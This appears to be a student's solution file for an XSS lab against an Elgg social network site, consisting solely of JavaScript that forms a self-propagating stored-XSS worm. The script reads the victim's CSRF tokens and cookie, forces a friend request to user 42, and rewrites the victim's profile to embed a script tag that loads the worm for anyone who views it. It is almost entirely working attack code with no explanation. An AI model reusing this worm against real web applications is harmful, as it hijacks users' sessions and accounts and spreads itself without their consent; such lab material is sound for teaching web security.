alert(document.cookie);

url = "http://www.xsslabelgg.com/action/friends/add?friend=42&__elgg_ts=" + elgg.security.token.__elgg_ts + "&__elgg_token=" + elgg.security.token.__elgg_token;

var Ajax1 = null;
Ajax1 = new XMLHttpRequest();
Ajax1.open("GET", url, true);
Ajax1.setRequestHeader("Host", "www.xsslabelgg.com");
Ajax1.setRequestHeader("Keep-Alive", "300");
Ajax1.setRequestHeader("Connection", "keep-alive");
Ajax1.setRequestHeader("Cookie", document.cookie);
Ajax1.send();

var Ajax2 = null;
Ajax2 = new XMLHttpRequest();
Ajax2.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
Ajax2.setRequestHeader("Host", "www.xsslabelgg.com");
Ajax2.setRequestHeader("Keep-Alive", "300");
Ajax2.setRequestHeader("Connection", "keep-alive");
Ajax2.setRequestHeader("Cookie", document.cookie);
Ajax2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

var injectCode = escape('<script src="http://127.0.0.1/lab5_xss.js"></script>');
Ajax2.send("__elgg_token=" + elgg.security.token.__elgg_token + "&__elgg_ts=" + elgg.security.token.__elgg_ts + "&name=" + elgg.session.user.name + "&description=&accesslevel%5Bdescription%5D=2&briefdescription=" + injectCode + "&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid=42");
